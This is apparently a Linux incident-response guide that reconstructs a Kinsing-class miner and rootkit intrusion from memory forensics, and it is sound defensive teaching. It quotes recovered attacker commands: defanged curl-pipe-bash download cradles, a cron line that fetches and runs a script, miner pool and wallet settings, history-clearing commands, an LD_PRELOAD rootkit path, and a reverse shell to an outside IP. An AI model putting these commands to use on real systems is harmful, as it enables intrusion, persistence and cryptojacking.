# Investigation Workflow (Linux) - from toolkit output to the chain of events

**This is the hand-off.** The platform workflow ([WORKFLOW-LINUX.md](WORKFLOW-LINUX.md))
**collects, analyzes, and enriches** - it gathers everything the host and its memory hold and ties it
to real infrastructure. **This guide is what a IR/FR analyst then does with that output** to piece
together *what actually happened* on a Linux host. The toolkit does the mechanical work; the analyst
does the reasoning. (For Windows hosts, see the companion
[WORKFLOW-INVESTIGATION-WINDOWS.md](WORKFLOW-INVESTIGATION-WINDOWS.md).)

For the rule-by-rule logic of turning a YARA byte-match into a benign/true-positive verdict, see
[WORKFLOW-YARA.md](WORKFLOW-YARA.md); this guide is the broader "now build the story" layer above it.

### In plain terms

An investigation answers four questions: **What got in? How? What did it do? Where did it call home?**
On Linux the attacker rarely needs to drop a file that survives - the payload runs from `/dev/shm`, a
`memfd`, or a binary it deletes the instant it launches, and a userland rootkit hides it from `ps`,
`top`, and `ss`. So the strongest evidence is in the host's **memory (RAM)** and in artifacts the live
OS may be actively lying about. This guide walks through reading those clues **in a logical order** to
tell the story end to end - and how to investigate the attacker's servers **safely, without tipping
them off**.

You do **not** need to be at the affected host; everything here is reasoning over files the toolkit
already produced. The flow follows the natural arc of an investigation:

> **be safe → find the implant → see what it is → list where it called → locate those servers → build the story → report it**

> The walkthrough below follows a **representative modern Linux server compromise** - a miner/rootkit
> intrusion of the kind that dominates real Linux incidents (Kinsing/`kdevtmpfsi`-class). The chain,
> techniques, and artifacts are the ones you are most likely to encounter. Network indicators are
> **defanged** (`hxxp`, `[.]`, `stratum+tcp` shown inert) - safe at rest. Substitute your own host's
> values as you read.

---

## What the toolkit hands you

After the collection + memory/enrichment stage, the per-host folder (`reports/<host>/`) contains:

| Artifact | What it gives the analyst |
|---|---|
| `EDR_Report_<stamp>.json` | Live host hunt (`edr_hunt.py`): persistence, `LD_PRELOAD`/`ld.so.preload` hijacks, SUID/cap abuse, network audit, credential-access-by-handle, masquerade, deleted-running binaries, SSH `authorized_keys` audit |
| `Memory_Findings_<stamp>.json` | Volatility analysis (`analyze_memory_linux.py`): injected/anon-exec memory, kernel-hook integrity (syscall/ftrace/tracepoint/netfilter), hidden processes (pslist vs pidhashtable), ptrace injection, process spoofing, recovered shell history |
| `Memory_Enrichment_<stamp>.md` / `_*.json` | Per-PID footprint (`memory_enrich.py`): confirmed/recovered/unverified hosts, IPs **with offline country**, implant config DNA (beacon URI templates, User-Agent, **miner pool + wallet**, rootkit markers), carved regions |
| `Journal_Findings_<stamp>.json` | systemd-journal / syslog analysis (`journal_analysis.py`): auth failures + successes, `sudo` use, new unit installs, service starts, segfaults from exploit attempts |
| `RemoteAccess_Findings_*.json` | `remote_access_triage.py`: reverse-shell indicators, RMM/tunnelling tooling, suspicious remote sessions |
| `Container_Findings_*.json` | `container_hunt.py`: privileged containers, host-namespace/`docker.sock` mounts, dangerous caps, RBAC over-grants (when the host runs containers) |
| `Adjudication_<stamp>.json` / `.md` | `adjudicate.py`: every finding placed on the verdict ladder (True Positive / Indeterminate / Likely FP) with cross-source **correlation** |
| `IOCs.json` | Machine-readable indicators (C2/pool endpoints carry per-IP `country`) for egress blocking + eradication |
| `Attack_Graph.md` / `Timeline.md` / `Incident_Report.md` | Memory-derived chain, time-ordered events, draft report |
| `tools/binja/data/<id>/` | Carved injected/`memfd` regions (`.bin` + sidecar) for deep RE in Binary Ninja |

Everything below is reasoning over those files. **You should not have to re-run the host** - the data
is already gathered.

### Which part of the tool produces what - and what you do with it

| The tool does this (automatic) | ...and produces | The analyst then... |
|---|---|---|
| **Live host hunt** (`edr_hunt.py`) | persistence / rootkit / cred-access findings, behaviorally adjudicated | **Step 4** - confirm the host-resident foothold |
| **Memory analysis** (`analyze_memory_linux.py`) | injection, kernel hooks, hidden procs, spoofing, recovered history | **Step 1/4** - find what hid from the live OS |
| **Config-DNA + IOC sweep** (`memory_enrich.py`) | miner pool/wallet, beacon templates, rootkit markers, sorted hosts/URLs | **Step 2/3** - read the implant's behaviour |
| **Offline geo** (`memory_enrich.py` + `tools/geoip`) | each IP tagged with its country (no network) | **Step 2** - first-pass infrastructure attribution |
| **Correlation/adjudication** (`adjudicate.py`) | the verdict ladder, signals converged per PID | **Step 4** - separate true positives from noise |
| **Region carve** (`--carve` → `tools/binja/data/`) | injected/`memfd` code as raw `.bin` + sidecar | hand to a reverse-engineer if needed |
| *(nothing - this is the human part)* | - | **Step 5** - order it all into the chain of events |

So the tool **gathers and labels**; the analyst **interprets and sequences**.

---

## Golden rule: investigate passively

> **Never touch the live infrastructure from a host.** Do **not** paste a recovered URL/IP/pool into a
> browser, `curl`, `wget`, `dig`, or `ping` it - that alerts the operator and can re-trigger the
> payload or get your responder IP flagged. Submit the **defanged** indicator to OSINT instead:
> - **urlscan.io** and **tria.ge** (Hatching Triage) - detonate URLs / samples in a sandbox
> - **VirusTotal** - file / URL / domain / IP reputation + related samples (search the miner **wallet**
>   and **pool** strings here - they cluster campaigns fast)
> - **AlienVault OTX** / **IBM X-Force Exchange** - campaign / pulse context
> - **Shodan.io** - what an IP is actually hosting (ports, banners, mining-pool fingerprints)
>
> Pivot on the data those services return, never on the live host.

---

## Step 1 - triage the recovered hosts (the IOC logic)

The enrichment classifies every captured host so you chase signal, not noise:

- **Confirmed domains** (structurally valid TLD) - your actionable set: `cdn-telemetry[.]net`,
  `api[.]sys-update[.]io`, `pool[.]hashvault[.]pro`, `raw[.]githubusercontent[.]com` (abused as a
  stage host).
- **Recovered at the parse boundary** - in raw memory two strings run together with no delimiter;
  `pool.hashvault.prokdevtmpfsi` was trimmed back to the real `pool[.]hashvault[.]pro` (recovered, not
  invented).
- **Unverified - "not resolvable, verify"** (kept, never asserted, never deleted): `sys-update`,
  `lh[.]sh`, `xmr-node`, `c3pool`. Run each through urlscan/VirusTotal before dismissing - it may be an
  uncommon-TLD domain or a pool alias, not just an over-capture.

> **Why this matters:** nothing is suppressed, but the high-confidence set is separated from the noise,
> so you start from real endpoints and consciously decide which "unverified" leftovers to chase.

---

## Step 2 - tie the IPs to infrastructure (offline geo)

Each recovered IP carries an **offline** country tag (db-ip Lite in `tools/geoip/`; no DNS/whois/API):

| IP (defanged) | Country (offline) | Seen pulling |
|---|---|---|
| `45[.]9[.]148[.]37` | RU (Russia) | `/lh.sh` (stage-1 dropper) + `kinsing` second stage |
| `185[.]220[.]101[.]52` | DE (Germany) | reverse shell (`:443`) |
| `193[.]233[.]132[.]a` | NL (Netherlands) | beacon to `cdn-telemetry[.]net` |

Geo is a **first-pass lead**: the country a DB reports can differ from the provider's registration -
confirm hosting/ownership in **Shodan** / **X-Force** before drawing attribution conclusions. A pool
IP on a mining port (3333/5555/7777/443) in Shodan is strong corroboration of the miner objective.

---

## Step 3 - read the implant (config DNA recovered from memory)

IOC reconstruction is not just hosts. The sweep pulls the implant's own configuration strings, which
tell you its **behaviour** and give you the strongest hunt pivots:

- **Cryptominer config (T1496)** - `stratum+tcp://pool[.]hashvault[.]pro:443 -u <Monero-wallet>.<host>
  -p x`, algo `rx/0` (RandomX), wallet `48xMrV...` and the miner binary name `kdevtmpfsi` - the single
  most common Linux objective; the wallet is a campaign-wide pivot in VirusTotal.
- **Download cradle / loader** - `curl -fsSL hxxp://45[.]9[.]148[.]37/lh.sh | bash`, and a second-stage
  Go binary `kinsing` - a fetch-and-run loader (T1105/T1059.004).
- **HTTP beacon template** - `/get?uuid=%s&arch=%s&osname=%s` filled per check-in to
  `hxxps://cdn-telemetry[.]net/get`, with a generic `curl/7.x` or a templated User-Agent - a network
  pivot (search proxy/Zeek logs for the exact URI shape).
- **Userland rootkit marker (T1014 / T1574.006)** - `/etc/ld.so.preload` → `/dev/shm/.x/libprocesshider.so`
  (or a `libs.so` masquerade): an `LD_PRELOAD` hook that filters `/proc` so `ps`/`top`/`ss` never show
  the miner or its socket. This is why the live host looked clean.
- **Anti-competition / cleanup** - markers that kill rival miners and clear history (`pkill -f xmrig`,
  `history -c`, `> ~/.bash_history`) (T1070).
- **Single-instance lock** - a pidfile/lock under `/tmp/.ICE-unix/` (host-survey IOC).

---

## Step 4 - read the findings into verdicts (the adjudication ladder)

`adjudicate.py` places every finding on a ladder - **True Positive** (confirmed), **Indeterminate**
(real, needs an analyst), **Likely False Positive** - and raises a **Correlated Threat** when signals
**converge on one PID/lineage**. The discriminator is **behaviour and provenance, not a keyword**.

**The true positives - they converge on the masqueraded miner process:**

| Finding (source) | What the tool surfaced | Verdict |
|---|---|---|
| `External Connection From Untrusted Binary` (`edr_hunt`/memory) | a process beaconing to `cdn-telemetry[.]net:443` whose exe is **deleted on disk** | **TP** - C2 *regardless of port* (443 defeats a port allow-list; the deleted binary does not) |
| `Kernel-Thread Name Masquerade` (`process_spoofing`) | a process presenting `comm=[kworker/u8:2]` but running `/tmp/.ICE-unix/.x/kdevtmpfsi` | **TP** - PR_SET_NAME masquerade; real kworkers have no exe |
| `Linker Hijack` (`analyze_envars`/`edr_hunt`) | `LD_PRELOAD=/dev/shm/.x/libprocesshider.so` | **TP** - preload from a writable/volatile path = rootkit |
| `Hidden Process` (pslist vs pidhashtable) | miner PID in the hashtable but not in `pslist` | **TP** - the rootkit's `/proc` filtering, seen from memory |
| `CoinMiner` config DNA + correlation | pool/wallet on the same PID lineage as the C2 + injection | **Correlated Threat** - high-confidence compromise |

**The noise - the same surfaces, but benign provenance (do not chase these):**

- **`LD_PRELOAD=libmozsandbox.so`** on a Firefox process → a **bare soname from a trusted libdir** is
  the sandbox, **Low**, not a hijack. The discriminator is the *path*: `/dev/shm/.x/…` is the implant,
  `libmozsandbox.so` is not.
- **eBPF programs** of type `cgroup_skb`/`cgroup_device` named `sd_*` → **systemd**, observability, not
  a hiding hook. A program on a `getdents64`/`tcp4_seq_show` **tracepoint** is the one to chase.
- **Anonymous executable memory** in `gnome-shell`/`gjs`/`node` → **JIT**, expected; the same anon-exec
  in a deleted-binary process with a thread IP running inside it is injection.
- **Shell history** like `ls /tmp/…`, `cd /tmp/`, `cat /tmp/x` → a bare `/tmp` *reference* is benign;
  **executing** from there (`/tmp/.x/kinsing`, `bash /dev/shm/lh.sh`) is the implant.

> **The lesson:** provenance is the verdict. *Where the binary lives*, *whether it is deleted/`memfd`*,
> *whether the preload path is writable*, and *whether signals converge on one PID* decide it - not the
> rule name or the mere presence of a `/tmp` string.

> **Why memory + offline analysis is non-negotiable on Linux.** A userland rootkit (`libprocesshider`)
> or an eBPF/`getdents` hook makes the live `ps`, `top`, `ss`, and `ls` **omit** the miner entirely - a
> live triage and even an on-disk AV scan can come back clean while the host mines 24/7. Only the
> memory image (which the rootkit cannot filter) and the integrity plugins (pslist-vs-pidhashtable,
> ftrace/tracepoint hooks) reveal it.

---

## Important: this is a reconstructed floor, not the whole story

Two things limit how complete the picture can be - say so explicitly in any report:

1. **Memory is a snapshot of one boot.** Process-start times are this boot's session start, not when
   the malware first ran; a reboot resets them and the cron/systemd persistence reloads the payload.
2. **Pre-collection cleanup and rootkit filtering destroy/hide evidence.** If the attacker's
   `history -c`, log truncation, or `/proc` rootkit ran before capture, parts of the chain are
   **reconstructed from strings that survived in RAM**, not directly observed. The real extent may be
   **larger** - earlier stages, cleared logs, and (given harvested SSH keys) **other hosts** may not
   appear here.

> **Best practice the next responder should follow: capture memory FIRST (`avml`/LiME), then
> remediate.** Imaging before cleanup is what preserves the full chain. Treat the reconstruction as
> "at least this happened," not "only this happened."

---

## Step 5 - reconstruct the chain (order indicators by role)

Order what you have into initial-access → execution → privesc → persistence → evasion → C2 → impact:

1. **Initial access (T1190)** - an **internet-facing web application** was hit with an unauthenticated
   RCE; `Journal_Findings` shows the web service (`nginx`/`php-fpm`/the app unit) spawning a shell and
   a burst of 5xx/segfaults at the intrusion time. *Detonate any captured exploit URL in tria.ge, do
   not open it on a host.*
2. **Execution (T1059.004 / T1105)** - the web user (`www-data`) ran a **download cradle**:
   ```bash
   curl -fsSL hxxp://45[.]9[.]148[.]37/lh.sh | bash
   ```
   which fetched the Go loader `kinsing` to `/tmp` and launched a fileless stage (`memfd`).
3. **Privilege escalation (T1548 / T1068)** - recovered history shows recon (`id`, `uname -a`,
   `sudo -l`, `find / -perm -4000`) then abuse of a **misconfigured `sudo`/SUID (GTFOBins)** to reach
   root - `edr_hunt` flags the unexpected SUID / dangerous capability that made it possible.
4. **Persistence (T1053.003 / T1543.002 / T1098.004 / T1574.006)** - layered, as attackers do:
   - **cron**: `* * * * * (curl -fsSL hxxp://api[.]sys-update[.]io/lh.sh || wget -q -O- …) | bash`
   - **systemd**: a root unit `bot.service` with `ExecStart=/tmp/.x/kinsing` (flagged: root unit,
     binary in a writable path)
   - **SSH**: a key appended to **root**'s `authorized_keys` (flagged: owner mismatch; the **same key
     reused across accounts** = lateral-movement key)
   - **rootkit**: `/etc/ld.so.preload` → `/dev/shm/.x/libprocesshider.so`
5. **Defense evasion (T1070 / T1036.004 / T1014)** - `history -c` + truncated `wtmp`/`auth.log`
   (`check_log_tampering`), the miner masqueraded as `[kworker/u8:2]` with its on-disk binary
   **deleted**, and the `LD_PRELOAD` rootkit hiding the process/socket from the live OS.
6. **Credential access (T1003.008 / T1552.004)** - a non-auth process held an **open handle to
   `/etc/shadow`** (`check_credential_access`) and harvested `~/.ssh/` private keys.
7. **C2 (T1071 / T1095)** - `kinsing` beacons over HTTPS to `cdn-telemetry[.]net/get` (NL) and pulls
   modules from `45[.]9[.]148[.]37` (RU); a reverse shell to `185[.]220[.]101[.]52:443` (DE) gave
   interactive access.
8. **Impact (T1496)** - `kdevtmpfsi` runs **XMRig/RandomX**, mining Monero to
   `stratum+tcp://pool[.]hashvault[.]pro:443` under the operator's wallet; it kills competing miners
   first.
9. **Lateral movement (T1021.004)** - the harvested + reused SSH key gives the operator pivot access to
   other internal hosts (which may not appear in this single image).

**The actual story.** An internet-facing web app was exploited (T1190); the `www-data` user ran a
`curl|bash` cradle that pulled the **Kinsing-class** Go loader, which escalated to root via a `sudo`/SUID
misconfiguration. It nailed down persistence four ways (cron, a root systemd unit from `/tmp`, a root
SSH key, and an `/etc/ld.so.preload` userland rootkit), cleared logs and history, and ran a
**`kdevtmpfsi` Monero miner** masqueraded as `[kworker]` with its binary deleted on disk. It beacons to
**NL/RU** C2, opened a reverse shell to **DE**, read `/etc/shadow`, and harvested SSH keys for lateral
movement. The live host looked clean because the rootkit filtered `/proc` - the miner, its socket, and
the chain were recovered from **RAM + the integrity plugins**, then tied to real infrastructure offline.

---

## Step 6 - corroborate, then act, then report

1. **Corroborate** each indicator in OSINT (the **wallet** and **pool** strings and the beacon URI are
   especially searchable in VirusTotal / OTX / urlscan). Promote an `unverified` host only once OSINT
   backs it.
2. **Act** - feed the confirmed set into `IOCs.json` (it carries the per-IP country) for egress
   blocking (`04_block_c2.sh` / `monitor_egress.sh`) and eradication via `Invoke-Eradication-Linux.sh`
   (analyst-gated: kills the masqueraded process, removes the cron/systemd/`ld.so.preload`/SSH-key
   persistence, sha256-verifies quarantine). For deep RE, open the carved `memfd`/injected regions from
   `tools/binja/data/` in the isolated Binary Ninja container.
3. **Report** - preserve the memory image, the IOC list, and the generated reports as evidence.
   Because SSH keys were harvested, **rotate credentials and check the other hosts** the reused key
   could reach.

---

*The platform workflow gathers and enriches the evidence; this guide is the analyst's reasoning that
turns it into the chain of events. Start at Step 1 with the enrichment output already in hand.*
